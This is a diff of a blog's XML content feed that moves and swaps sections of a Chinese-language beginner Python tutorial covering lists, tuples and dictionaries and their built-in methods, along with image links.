-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271812882.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261435724.png"
                       alt="image.png"
                 ></p>
 <blockquote>
@@ -817,223 +538,243 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271814276.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261437830.png"
                       alt="image.png"
                 ></p>
-<h2 id="元组的相关操作"><a href="#元组的相关操作" class="headerlink" title="元组的相关操作"></a>元组的相关操作</h2><h3 id="元组的修改"><a href="#元组的修改" class="headerlink" title="元组的修改"></a>元组的修改</h3><p>元组内单独的元素是无法被修改的，当你想要修改元素时，是一个非法操作，Python会对此报错处理<br><img  
+<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>Python是一门很多内置函数的语言，并且函数的用法都很多样，有些你可能根本没遇到过，所以要学会<strong>上网查询</strong>，不会的可以留言。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python从入门到精通——2. 1 列表创建及相关操作</title>
+    <url>/2024/09/25/d56bb46a6c29/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>序列是Python中最基本的数据结构，序列中的每个值都有对应位置上的数据值，称之为索引。<br><em><strong>注意：索引的第一个是0</strong></em></p>
+<p><strong>在Python中，一共有6个内置类型，其中列表和元组是最常见的类型。</strong></p>
+<hr>
+<h1 id="1-列表"><a href="#1-列表" class="headerlink" title="1. 列表"></a>1. 列表</h1><h2 id="1-1-列表是什么及其创建"><a href="#1-1-列表是什么及其创建" class="headerlink" title="1.1 列表是什么及其创建"></a>1.1 列表是什么及其创建</h2><p><strong>列表</strong>是由一系列按特定顺序排列的元素的组成。包括你不仅可以创建包含字⺟表中所有字⺟、数字 0~9 或所有家庭成员姓名的列表，还可以将任何东西加⼊列表，其中的元素之间可以没有任何关系。列表通常包含多个元素，因此给列表指定⼀个表⽰复数的名称（如 letters、digits 或 names）是个不错的主意。<br>你可以把列表理解为C语言中的数组，但是Python的列表是一个更宏观的概念，它可以包括你想到的任何数据内容。<br>Python中，列表用中括号<code>[]</code>表示，用逗号分割其中的元素（ps：这里都是指英文半角下的符号，不能用中文符号，不然就会报错）。<br>举个例子：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271818166.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251541693.png"
                       alt="image.png"
-                ></p>
-<p>但是我们可以给元组的变量再次赋值，然后覆盖之前的元组。<br><img  
+                ><br>可以看到：Python 将打印列表的内部表⽰，<strong>包括⽅括号。</strong></p>
+<hr>
+<h2 id="1-2-列表的相关操作"><a href="#1-2-列表的相关操作" class="headerlink" title="1.2 列表的相关操作"></a>1.2 列表的相关操作</h2><h3 id="1-2-1-列表索引访问"><a href="#1-2-1-列表索引访问" class="headerlink" title="1.2.1 列表索引访问"></a>1.2.1 列表索引访问</h3><h4 id="单个索引访问"><a href="#单个索引访问" class="headerlink" title="单个索引访问"></a>单个索引访问</h4><p>列表是一个有序集合，也就是说其中的元素并不是无序的，每个元素都有自己的位置，也就是[[#前言]]说的<code>索引</code>。我们要访问列表中的某一个位置，可以直接告诉Python这个位置的索引（我们说的第n个元素或位置，其索引要减去1，也就是索引为n-1）。要访问列表元素，可以指出列表的名称加上元素索引，索引要放在中括号内。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271816744.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251542461.png"
                       alt="image.png"
                 ></p>
-<p>并且我们可以对元组进行组合，得到一个新的元组<br><img  
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>举个例子：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271817595.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251543939.png"
                       alt="image.png"
                 ></p>
-<h3 id="元组的删除"><a href="#元组的删除" class="headerlink" title="元组的删除"></a>元组的删除</h3><p>元组中的元素值也是不允许被删除的，但是我们可以使用del语句来删除整个元组，让元组从程序变量中被删除。<br>删除后的元组若进行打印或者其他操作，将会报错<br><img  
+<p>这里有个特殊的方法，可以让你返回列表中的最后一个元素，无论列表的长度是多少，你都可以用索引<code>-1</code>来表示列表的最后一个元素，以此类推，索引<code>-2</code>用来访问倒数第二个元素……，如下：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271820703.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251550715.png"
                       alt="image.png"
                 ></p>
-<h3 id="元组的运算"><a href="#元组的运算" class="headerlink" title="元组的运算"></a>元组的运算</h3><p>可以通过运算符对元组进行相应的运算操作，这里的运算不是指加减乘除这些运算，而是一些针对于元组的操作。如：计算元素个数，元组的连接（得到新元组或者自加成为一个新元组），复制，判断元素是否存在，以及遍历迭代。具体如下：<br><img  
+<p><em>ps：访问的索引不能超过列表最后一个元素的索引，这样将会直接导致报错。只要列表不为空，索引<code>-1</code>来访问列表最后一个元素都有效</em></p>
+<h4 id="索引切片访问"><a href="#索引切片访问" class="headerlink" title="索引切片访问"></a>索引切片访问</h4><p>可以利用<code>[]</code>和<code>:</code>来确定一个索引范围来进行切片，就是对列表的某一段切出来进行打印。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271821035.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251708866.png"
                       alt="image.png"
                 ></p>
-<p><strong>元组的内置函数</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">序号</th>
-<th align="left">方法及描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">1</td>
-<td align="left">len(tuple) 计算元组元素个数。</td>
-</tr>
-<tr>
-<td align="left">2</td>
-<td align="left">max(tuple) 返回元组中元素最大值。</td>
-</tr>
-<tr>
-<td align="left">3</td>
-<td align="left">min(tuple) 返回元组中元素最小值。</td>
-</tr>
-<tr>
-<td align="left">4</td>
-<td align="left">tuple(iterable) 将可迭代系列转换为元组。</td>
-</tr>
-<tr>
-<td align="left">这里介绍一下第四个<code>tuple(iterable)</code>，这里的可迭代系列一般包括<code>list、str、tuple</code>，你可以简单理解为能够一次返回一个成员的对象，也就是可以 for…in 遍历的。比如你遍历一个列表，它可以每次给你返回一个元素，这就是可迭代。</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<h2 id="关于元组不可变的解释"><a href="#关于元组不可变的解释" class="headerlink" title="关于元组不可变的解释"></a>关于元组不可变的解释</h2><p>所谓的元组不可变指的是元组所指向的内存中的内容不可变，也就是当你的程序运行了，那么在这个程序中，你的元组在内存的内容就固定了，你没办法去改变内存中元组的值。<br>这里利用菜鸟教程的例子：<br><img  
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>注意：这里<code>:</code>右边的索引是不会被取到的，如下的<code>1:4</code>,是取不到索引为4的位置的元素。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271857598.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658095.png"
                       alt="image.png"
                 ></p>
-<p>可以看到，当你直接修改元组内部某个或某些元素的值是会报错的，但是当你把元组变量进行重新赋值，是可以的，并且重新赋值后，相当于变量绑定了新的对象，而不是修改了原来的对象，这里就把原来的对象覆盖了，所以也就得到了新的内存地址。</p>
-<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><h2 id="字典的定义"><a href="#字典的定义" class="headerlink" title="字典的定义"></a>字典的定义</h2><p>字典是另一种可变容器模型，也可以存储任意类型的对象和数据。<br>每个元素或者对象都是一个键值对，也就是一个键一个值<code>key:value</code>，每个键值对之间用逗号<code>,</code>分割，整个字典包在花括号<code>&#123;&#125;</code>中</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><em>ps：同样，<code>dict</code>作为是Python的<strong>关键字</strong>和<strong>内置函数</strong>，是不建议将变量名命名为<code>dict</code>的。</em><br><strong>值得注意：一个字典中，键值对是不能重复的，键必须是唯一的，但是值可以不唯一。比如字典中是每个人的爱好，名字不能相同，但是爱好可以相同。</strong></p>
-<h2 id="字典的创建"><a href="#字典的创建" class="headerlink" title="字典的创建"></a>字典的创建</h2><p>创建空字典：直接用一个大括号<code>&#123;&#125;</code>表示。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">emptyDict = &#123;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>同样，也可以用负数索引来表示倒数第几个元素<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658968.png"
+                      alt="image.png"
+                ></p>
+<p>有一种特殊情况，在<code>:</code>的左右两边是可以不加索引值的，意思是直接取到头，比如<code>2:</code>，表示从索引为2的（第三个）的元素取到最后一个（包括最后一个）。在前面切片范围的<code>:</code>之后还可以添加一个<code>:</code>，表示步长，所谓步长可以理解为等差数列的公差，就是隔一个步长取一个元素。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251704005.png"
+                      alt="image.png"
+                ></p>
+<p>你也可以用标准化输出来使用列表中的值，也就是第一章的<code>f</code>标准化输出<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251643872.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-2-列表的修改、添加、删除"><a href="#1-2-2-列表的修改、添加、删除" class="headerlink" title="1.2.2 列表的修改、添加、删除"></a>1.2.2 列表的修改、添加、删除</h3><p>Python的列表一般是动态的，也就是你可以对其中的某些元素进行一些操作来改变列表。比如当以后你自己做一个项目的适合，你自己做了一个游戏，游戏中有一些怪物，怪物是用一个列表存储的，当你消灭了一个怪物，这个怪物就会从列表中删除，相应的，当你通过一个关卡，列表中的怪物也会进行更新。</p>
+<h4 id="列表的修改"><a href="#列表的修改" class="headerlink" title="列表的修改"></a>列表的修改</h4><p>列表的修改十分简单，只是利用赋值运算符对某个索引位置的元素进行覆盖赋值。如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251710937.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的添加和删除（更新）"><a href="#列表的添加和删除（更新）" class="headerlink" title="列表的添加和删除（更新）"></a>列表的添加和删除（更新）</h4><p>列表的添加是一个很重要的操作，你可以用来更新你的列表数据，以达到你的目标要求。</p>
+<p>首先介绍一下队列：队列是一种先进先出（FIFO）的数据结构，我们可以使用列表来实现队列的基本功能。我们都知道在一个地方排队，是要从队伍末尾开始排的（不考虑没素质的人）。这样我们列表基本的添加和删除都是在列表的末尾进行操作的</p>
+<h5 id="append-函数"><a href="#append-函数" class="headerlink" title="append()函数"></a>append()函数</h5><p><strong>函数语法：<code>list.append(obj)</code></strong><br>首先来介绍列表的内置函数，可以把一个列表看成一个队列，这个append()函数也是满足队列的条件，是在列表的末尾进行添加。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251720596.png"
+                      alt="image.png"
+                ></p>
+<h5 id="pop-函数"><a href="#pop-函数" class="headerlink" title="pop()函数"></a>pop()函数</h5><p><strong>函数语法：<code>list.pop([index=-1])</code></strong><br><em>ps：pop()的默认参数就是最后一个索引，一般不自主选择（当然也可以自己选择索引）。这里需要注意，pop()函数是有返回值的，返回值就是你选择删除的数据，可以理解为一个抽象的栈，把数据从栈里面弹出来</em><br><code>pop()</code>函数是和<code>append()</code>函数相对的，这个函数是将列表的最后一个元素删除。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272030878.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251724325.png"
                       alt="image.png"
-                ></p>
-<h2 id="字典的访问"><a href="#字典的访问" class="headerlink" title="字典的访问"></a>字典的访问</h2><p>在字典中，我们已经知道了存储的是一系列键值对，所以每一个键都对应着一个值，这样我们就可以通过使用键来访问与之关联的值。与键相关连的可以是数、字符串、列表甚至又是一个字典（又是嵌套，Python最恶心的东西）。<br>下面我们先看一个例子：<br><img  
+                ><br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272037666.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251841067.png"
                       alt="image.png"
                 ></p>
-<h3 id="get函数"><a href="#get函数" class="headerlink" title="get函数"></a>get函数</h3><p>对于访问一个键值对，这里我们讲解一个方法：<code>get()</code><br>这个方法针对于你想要访问一个键，但是你不知道字典中是否存在这个键的情况。<br>语法：<code>get(key,text)</code></p>
+<h5 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h5><p><strong>函数语法：<code>list.insert(index, obj)</code></strong><br>    <em>ps：- index – 对象 obj 需要插入的索引位置     - obj – 要插入列表中的对象。</em><br>这个函数字面意思就是插入，你可以插入数据到列表的任意一个地方，你甚至可以插入一个列表，这就是列表的嵌套。当你插入一个数据后，后面的所有数据都会向后移一个位置，也就是索引加一<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251831764.png"
+                      alt="image.png"
+                ></p>
+<h5 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h5><p><strong>语法：<code>del list[index]</code></strong><br><code>del</code><em>不是</em><code>python3</code> 中的<strong>内置函数</strong>，<code>del</code>只是一个关键字，就跟<code>import</code>和<code>return</code>一样<br>del也是可以删除列表中任意位置的数据，你只需要知道数据的索引即可<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251838748.png"
+                      alt="image.png"
+                ></p>
+<h5 id="比较del和pop"><a href="#比较del和pop" class="headerlink" title="比较del和pop()"></a>比较del和pop()</h5><p>当你想要删除数据时该如何选择呢？这个其实很简单，当你想要直接删除数据并且不想再使用这个数据时，你就可以用del语句，直接将数据清楚；当然你也可以用pop()函数，但是不用一个变量来保存这个删除的数据，也就相当于直接删除。如果你想要将数据从列表中取出来，并且要将这个数据用以其他操作，那么你就只能用pop()函数。</p>
+<h5 id="remove-函数"><a href="#remove-函数" class="headerlink" title="remove()函数"></a>remove()函数</h5><p>有时候，你不知道要从列表中删除的值在哪个位置。如果只知道要删除的元素的值，可使⽤ <code>remove()</code> ⽅法。<br><em>ps：<code>remove()</code>函数只会删除第一个满足条件的数据，也就是当找到了第一个需要删除的元素，他就停止寻找了。如果想要删除更多或者全部相同元素，就需要使用循环，这将在后面循环结构的一章进行讲解</em><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251857448.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5><p><strong>函数语法：<code>list.sort(cmp=None, key=None, reverse=False)</code></strong></p>
 <ul>
-<li>key：你想访问的键</li>
-<li>text：如果不存在这个键，你想要返回输出的值（<strong>不是必要参数，默认为None</strong>）<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272103525.png"
-                      alt="image.png"
-                ></li>
+<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
+<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
+<li>reverse – 排序规则，reverse &#x3D; True 降序， reverse &#x3D; False 升序（默认）。</li>
 </ul>
-<h2 id="字典的相关操作"><a href="#字典的相关操作" class="headerlink" title="字典的相关操作"></a>字典的相关操作</h2><h3 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h3><p>因为字典是一个动态结构，并且键值对都是唯一的，所以我们可以随时添加<strong>不重复</strong>的键值对，并且可以直接通过引用要加的键然后将其赋值，就可以成功添加。（如果对重复的键赋值就变成了更新键值对，可以参考下面<strong>字典的修改</strong>）<br><img  
+<p>Python有一个内置函数，可以对列表轻松的进行排序。值得注意的是，<code>sort()</code>函数不止对数字进行排序，也可以对字母进行排序。如下：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272050469.png"
-                      alt="image.png"
-                ><br>ps：一般添加的键值对都在字典末尾</p>
-<h3 id="字典的修改"><a href="#字典的修改" class="headerlink" title="字典的修改"></a>字典的修改</h3><p>字典的修改十分简单，直接对字典的某个键进行引用并且对其赋值，就会覆盖之前的值，从而更新<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272052351.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251911202.png"
                       alt="image.png"
                 ></p>
-<h3 id="删除键值对"><a href="#删除键值对" class="headerlink" title="删除键值对"></a>删除键值对</h3><p>对于键值对的删除，可以删除一个元素，也可以清空整个字典<br>这里我们都使用del语句（ps：这里被删除的元素是永远消失了，就是在之后的程序运行中就没有了，之后你无法再次对这个键进行任何操作，如果你引用这个键将会报错中断程序）<br><img  
+<p>当然也可以对列表进行逆序，只需要加上参数<code>reverse = True</code><br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272055049.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251923030.png"
                       alt="image.png"
                 ></p>
-<h2 id="字典的嵌套"><a href="#字典的嵌套" class="headerlink" title="字典的嵌套"></a>字典的嵌套</h2><p>字典的嵌套是分为三类的，第一类是多个字典组合成一个列表，第二类是字典中的键值对的值是一个列表，第三类是字典中键值对的值是一个字典</p>
-<h3 id="字典-列表"><a href="#字典-列表" class="headerlink" title="字典&#x3D;&gt;列表"></a>字典&#x3D;&gt;列表</h3><p>就是可以创建多个字典，然后每个字典作为一个元素组合成一个列表<br><img  
+<h5 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h5><p><code>sort()</code>函数使用之后，列表的顺序就会被永久改变，如果想要进行临时排序，就可以使用<code>sorted()</code>函数<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272116419.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251931129.png"
+                      alt="image.png"
+                ><br>在调⽤ <code>sorted()</code> 函数后，列表元素的排列顺序并没有变<br>如果要按与字⺟顺序相反的顺序显⽰列表，也可向 <code>sorted()</code> 函数 传递参数 <code>reverse=True</code></p>
+<p><em>ps：在并⾮所有的值都是全小写的时，按字⺟顺序排列列表要复杂⼀些。在确定排列顺序时，有多种解读⼤写字⺟的⽅式，此时要指定准确的排列顺序，可能会比这⾥所做的更加复杂。然而，大多数排序方式是以本节介绍的知识为基础的。</em></p>
+<h5 id="reverse-函数"><a href="#reverse-函数" class="headerlink" title="reverse()函数"></a>reverse()函数</h5><p>要反转列表元素的排列顺序，可使⽤ reverse() ⽅法。这里是将原列表的顺序进行反转，而不是排序后反转<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251934680.png"
                       alt="image.png"
                 ></p>
-<h3 id="列表作为值"><a href="#列表作为值" class="headerlink" title="列表作为值"></a>列表作为值</h3><p>这个不过多解释，就是可以把一个列表当成一个键值对的值。<strong>再次强调，列表不能作为键值对的键</strong><br><img  
+<h4 id="列表的其他操作"><a href="#列表的其他操作" class="headerlink" title="列表的其他操作"></a>列表的其他操作</h4><h5 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h5><p>这个函数是用来统计列表中某个数据出现的次数的<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272117979.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946234.png"
                       alt="image.png"
                 ></p>
-<h3 id="字典作为值"><a href="#字典作为值" class="headerlink" title="字典作为值"></a>字典作为值</h3><p>字典套字典套字典套字典……，能一直套娃，和上面类似<br><img  
+<h5 id="extend-函数"><a href="#extend-函数" class="headerlink" title="extend()函数"></a>extend()函数</h5><p>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272119297.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946805.png"
                       alt="image.png"
                 ></p>
-<h2 id="字典的特性"><a href="#字典的特性" class="headerlink" title="字典的特性"></a>字典的特性</h2><ol>
-<li>不允许一个键出现两次。如果创建字典时一个键被赋值两次，那么后一个值会覆盖前一个值<br><img  
+<h5 id="index-函数"><a href="#index-函数" class="headerlink" title="index()函数"></a>index()函数</h5><p>从列表中找出某个值第一个匹配项的索引位置<br><em>ps：如果在列表中有重复元素，只会索引到目标数据第一次出现的索引位置</em><br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272106702.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251947793.png"
                       alt="image.png"
-                ></li>
-<li>键必须是一个不可变的对象类型，比如数字、字符串或者元组。但是列表就不行，因为列表是一个动态的对象<br><img  
+                ></p>
+<h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy()函数"></a>copy()函数</h5><p>将一个列表进行复制并返回该复制的列表<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272108579.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251948401.png"
                       alt="image.png"
-                ></li>
-</ol>
-<h2 id="字典的内置函数"><a href="#字典的内置函数" class="headerlink" title="字典的内置函数"></a>字典的内置函数</h2><table>
+                ></p>
+<h5 id="clear-函数"><a href="#clear-函数" class="headerlink" title="clear()函数"></a>clear()函数</h5><p>将列表清空<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251949806.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-3-Python列表脚本操作符"><a href="#1-2-3-Python列表脚本操作符" class="headerlink" title="1.2.3 Python列表脚本操作符"></a>1.2.3 Python列表脚本操作符</h3><p>列表对 <code>+</code> 和 <code>*</code> 的操作符与字符串相似。<code>+</code> 号用于组合列表，<code>*</code> 号用于重复列表。</p>
+<table>
 <thead>
 <tr>
-<th align="left">序号</th>
-<th align="left">函数及描述</th>
+<th align="left">Python 表达式</th>
+<th align="left">结果</th>
+<th align="left">描述</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">1</td>
-<td align="left"><strong>dict.clear()</strong> 删除字典内所有元素</td>
-</tr>
-<tr>
-<td align="left">2</td>
-<td align="left"><strong>dict.copy()</strong> 返回一个字典的浅复制</td>
-</tr>
-<tr>
+<td align="left">len([1, 2, 3])</td>
 <td align="left">3</td>
-<td align="left"><strong>dict.fromkeys()</strong> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td>
+<td align="left">列表的长度</td>
 </tr>
 <tr>
-<td align="left">4</td>
-<td align="left"><strong>dict.get(key, default&#x3D;None)</strong> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td>
+<td align="left">[1, 2, 3] + [4, 5, 6]</td>
+<td align="left">[1, 2, 3, 4, 5, 6]</td>
+<td align="left">组合</td>
 </tr>
 <tr>
-<td align="left">5</td>
-<td align="left"><strong>key in dict</strong> 如果键在字典dict里返回true，否则返回false</td>
+<td align="left">[‘Hi!’] * 4</td>
+<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
+<td align="left">重复</td>
 </tr>
 <tr>
-<td align="left">6</td>
-<td align="left"><strong>dict.items()</strong> 以列表返回一个视图对象</td>
+<td align="left">3 in [1, 2, 3]</td>
+<td align="left">True</td>
+<td align="left">元素是否存在于列表中</td>
 </tr>
 <tr>
-<td align="left">7</td>
-<td align="left"><strong>dict.keys()</strong> 返回一个视图对象</td>
+<td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td>
+<td align="left">1 2 3</td>
+<td align="left">迭代</td>
 </tr>
 <tr>
-<td align="left">8</td>
-<td align="left"><strong>dict.setdefault(key, default&#x3D;None)</strong> 和**get()**类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
+<td align="left">max([1, 2, 3])</td>
+<td align="left">3</td>
+<td align="left">列表中的最大值</td>
 </tr>
 <tr>
-<td align="left">9</td>
-<td align="left"><strong>dict.update(dict2)</strong> 把字典dict2的键&#x2F;值对更新到dict里</td>
-</tr>
-<tr>
-<td align="left">10</td>
-<td align="left"><strong>dict.values()</strong> 返回一个视图对象</td>
-</tr>
-<tr>
-<td align="left">11</td>
-<td align="left"><strong>[pop(key,default])</strong> 删除字典 key（键）所对应的值，返回被删除的值。</td>
-</tr>
-<tr>
-<td align="left">12</td>
-<td align="left"><strong>popitem()</strong> 返回并删除字典中的最后一对键和值。</td>
-</tr>
-<tr>
-<td align="left">13</td>
-<td align="left"><strong>str()</strong> 输出字典，可以打印的字符串表示。其实就是把字典整体作为字符串输出</td>
+<td align="left">min([1, 2, 3])</td>
+<td align="left">1</td>
+<td align="left">列表中的最小值</td>
 </tr>
 </tbody></table>
 <blockquote>
-<p>参考：菜鸟教程</p>
+<p>[!NOTE] 本文用到的代码集合<br><a class="link"   href="https://github.com/dunm1e/blog_code/blob/main/Python_course_code/2.1.ipynb" >blog_code&#x2F;Python_course_code&#x2F;2.1.ipynb at main · dunm1e&#x2F;blog_code (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<p>这里演示部分函数：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272123327.png"
-                      alt="image.png"
-                ></p>
 ]]></content>
       <categories>
         <category>python</category>
@@ -1351,6 +1092,331 @@
       <tags>
         <tag>python</tag>
         <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python从入门到精通——2. 2 元组和字典的创建及相关操作</title>
+    <url>/2024/09/27/7185ada32ee0/</url>
+    <content><![CDATA[<h1 id="列表与元组的比较"><a href="#列表与元组的比较" class="headerlink" title="列表与元组的比较"></a>列表与元组的比较</h1><p>列表适合存储在程序中且在运行期间会进行变化的数据集，因为列表是可以变化的。但是元组不同，元组被赋值后就确定了，在后面的运行过程中是无法被更改的。所以列表和元组是有不同的应用场景的，列表一般应用于比如游戏内容或者网站用户等场景。而元组一般应用于一个游戏或者网站固定属性和内容的场景。</p>
+<h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><h2 id="元组的定义"><a href="#元组的定义" class="headerlink" title="元组的定义"></a>元组的定义</h2><p>元组是使用圆括号（小括号）来进行引用标识（其实这个说法有问题，具体原因后面会分析）。其他的方式和列表大差不差，括号中添加元素后，利用逗号隔开，一个元组内部也可以有多种类型的数据。<em>（ps：这里的符号也是英文半角下的符号，中文符号无法编译会报错）</em>。</p>
+<h2 id="元组的创建"><a href="#元组的创建" class="headerlink" title="元组的创建"></a>元组的创建</h2><p>创建一个空元组：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">tup = ()</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
